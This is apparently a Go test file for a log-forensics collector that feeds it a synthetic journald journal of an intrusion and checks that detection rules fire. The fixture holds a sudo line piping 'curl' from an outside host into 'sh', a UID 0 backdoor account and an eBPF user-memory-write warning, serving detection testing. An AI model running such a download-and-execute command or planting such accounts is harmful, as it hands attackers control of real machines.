package collector

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"testing"
)

// syslogEntry is a journal entry as journald stores a syslog message.
func syslogEntry(ident, msg string) []string {
	return []string{"_TRANSPORT=syslog", "SYSLOG_IDENTIFIER=" + ident, "_HOSTNAME=web1", "_PID=42", "MESSAGE=" + msg}
}

func TestScanJournaldFixture(t *testing.T) {
	var entries [][]string
	for i := 0; i < 12; i++ {
		entries = append(entries, syslogEntry("sshd", fmt.Sprintf("Failed password for root from 203.0.113.50 port %d ssh2", 50000+i)))
	}
	entries = append(entries,
		// The paired lines of one attempt (same port) count once.
		syslogEntry("sshd", "Failed password for invalid user admin from 203.0.113.50 port 51111 ssh2"),
		syslogEntry("sshd", "Invalid user admin from 203.0.113.50 port 51111"),
		syslogEntry("sshd", "Accepted password for root from 203.0.113.50 port 51200 ssh2"),
		syslogEntry("sshd", "Accepted publickey for deploy from 10.0.4.12 port 40100 ssh2"),
		syslogEntry("sudo", "   alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'curl -s http://198.51.100.7/i | sh'"),
		syslogEntry("useradd", "new user: name=svc-backup, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0"),
		syslogEntry("usermod", "add 'bob' to group 'sudo'"),
		syslogEntry("usermod", "add 'bob' to shadow group 'sudo'"),
		syslogEntry("CRON", "(root) CMD (test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily)"),
		syslogEntry("filler", "nothing to see"),
		[]string{"_TRANSPORT=kernel", "SYSLOG_IDENTIFIER=kernel", "MESSAGE=sshhide[777] is installing a program with bpf_probe_write_user helper that may corrupt user memory!"},
	)
	root := t.TempDir()
	dir := filepath.Join(root, "var", "log", "journal", "489edb7f40b043b883f52208e12c22dd")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "system.journal"), buildJournal(true, entries), 0o640); err != nil {
		t.Fatal(err)
	}

	res := scanJournald(context.Background(), root)
	if len(res.Errors) != 0 {
		t.Fatalf("errors: %v", res.Errors)
	}
	if res.Meta["entries_scanned"] != len(entries) {
		t.Fatalf("scanned %v of %d", res.Meta["entries_scanned"], len(entries))
	}
	by := recordsBy(res)
	want := map[string]int{"ssh_failed_logons": 1, "ssh_login": 2, "sudo": 1, "account": 2, "kernel": 1}
	for kind, n := range want {
		if len(by[kind]) != n {
			t.Errorf("%s: %d records, want %d", kind, len(by[kind]), n)
		}
	}
	if len(by["cron"]) != 0 {
		t.Error("an ordinary cron job was kept")
	}
	if f := by["ssh_failed_logons"][0].Fields; f["attempts"] != 13 || f["source"] != "203.0.113.50" {
		t.Errorf("failures: %+v", f)
	}
	var rootLogin Record
	for _, r := range by["ssh_login"] {
		if r.Fields["user"] == "root" {
			rootLogin = r
		} else if len(r.Findings) != 0 {
			t.Errorf("internal key logon flagged: %+v", r.Findings)
		}
	}
	if rootLogin.Fields["failures_before"] != 13 || !hasRule(rootLogin.Findings, "logon.ssh_bruteforce_success") {
		t.Fatalf("brute force then success: %+v", rootLogin)
	}
	if !hasRule(by["sudo"][0].Findings, "exec.download_pipe_shell") || !hasRule(by["kernel"][0].Findings, "persistence.ebpf_write_user") {
		t.Error("sudo / kernel findings missing")
	}
}

func TestScanJournaldNoJournal(t *testing.T) {
	res := scanJournald(context.Background(), t.TempDir())
	if len(res.Records) != 0 || res.Meta["note"] == nil {
		t.Fatalf("records %d meta %v", len(res.Records), res.Meta)
	}
}
